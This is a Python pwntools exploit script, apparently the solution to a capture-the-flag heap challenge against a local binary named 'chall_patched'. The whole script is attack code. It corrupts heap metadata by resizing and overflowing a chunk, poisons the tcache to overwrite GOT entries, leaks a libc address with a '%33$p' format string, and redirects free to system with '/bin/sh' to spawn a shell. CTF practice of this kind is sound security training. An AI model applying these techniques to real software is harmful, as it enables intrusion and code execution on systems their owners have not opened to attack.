from pwn import *
context.binary = "./chall_patched"

def add_chunk(Myindex, sizes):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b'Index\n>> ', str(Myindex).encode())
    p.sendlineafter(b'Size\n>> ', str(sizes).encode())

def change_size_chunk(Myindex, newsizes):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b'Index\n>> ', str(Myindex).encode())
    p.sendlineafter(b'Size\n>> ', str(newsizes).encode())


def delete_chunk(Myindex):
    p.sendlineafter(b'>>', b'3')
    p.sendlineafter(b'Index\n>> ', str(Myindex).encode())

def edit_chunk(Myindex, Mydata: bytes):
    p.sendlineafter(b'>>', b'4')
    p.sendlineafter(b'Index\n>> ', str(Myindex).encode())
    p.sendlineafter(b'Data\n>> ', Mydata)



p = process()
script = """
b*add+178
b*delete+131
b*edit+182
"""
printf_plt = 0x403540
free_plt = 0x403528-8



add_chunk(0,0x20)

add_chunk(1, 0x20)

add_chunk(2,0x20)

delete_chunk(2)
delete_chunk(1)

change_size_chunk(0,0x100)

payload = cyclic(40) + p64(0x31) + p64(free_plt)

# gdb.attach(p,script)
edit_chunk(0,payload)

add_chunk(1,0x20)
add_chunk(1,0x20)

payload2 = cyclic(8)+p64(0x401124)+p64(0x401124)
edit_chunk(1,payload2)

#gdb.attach(p,script)
add_chunk(2,0x50)
edit_chunk(2,b'%33$p')
delete_chunk(2)
leak = int(p.recvline().strip(b'\n'),base=16)
system_func = leak + 0x2e20d
log.info("Leak libc: %s", hex(leak))
payload3 = cyclic(8) + p64(system_func) + p64(0x401124)
edit_chunk(1,payload3)
edit_chunk(2,b'/bin/sh\x00')
delete_chunk(2)
p.interactive()